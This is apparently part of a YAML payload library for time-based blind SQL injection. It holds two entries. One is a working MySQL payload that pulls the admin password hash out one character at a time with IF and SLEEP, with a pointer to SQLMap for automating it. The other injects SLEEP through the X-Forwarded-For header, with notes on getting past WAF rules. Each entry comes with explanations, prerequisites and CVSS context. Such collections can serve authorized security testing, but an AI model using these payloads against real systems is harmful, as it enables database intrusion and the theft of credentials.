  - id: sqli-time-009
    title: Conditional time extraction of password hash
    payload_string: ''' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username=''admin''),1,1))=109,SLEEP(5),0)
      --'
    how_it_works: 'This payload tests whether the first character of the admin user''s password hash has ASCII value 109 (the
      letter ''m''). If true, the 5-second delay occurs; if false, the response is immediate. By iterating over all possible
      ASCII values or using binary search, each character of the password hash is extracted one at a time. This fully automates
      to a complete hash extraction, which can then be cracked offline. SQLMap''s --technique=T automates this process.

      '
    prerequisites:
    - MySQL with users table containing username/password columns
    - Measurable response timing
    waf_bypass_notes: Full extraction query; use SQLMap --technique=T for automation
    severity_context: CVSS 8.5 – full password hash extraction via time-based blind
    cve_refs:
    - CVE-2022-0739
    tags:
    - time-based
    - mysql
    - hash-extraction
    - data-extraction
    - automated
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: sqli-time-010
    title: Time-based via HTTP header injection
    payload_string: 'X-Forwarded-For: 127.0.0.1'' AND SLEEP(5) --'
    how_it_works: 'HTTP headers that are logged and queried in the database (such as X-Forwarded-For for IP-based access control,
      or User-Agent for analytics) may be injectable. When the header value is used in a SQL query without parameterization,
      time-based blind injection through headers is possible. This vector bypasses security controls focused on form parameters
      and URL query strings. The injected SLEEP confirms the time-based injection without any visible response change.

      '
    prerequisites:
    - HTTP header value used in SQL query
    - No parameterization for header-sourced values
    waf_bypass_notes: Header parameters often bypass WAF rules targeting body/query params
    severity_context: CVSS 7.5 – time-based blind SQLi via HTTP header
    cve_refs: []
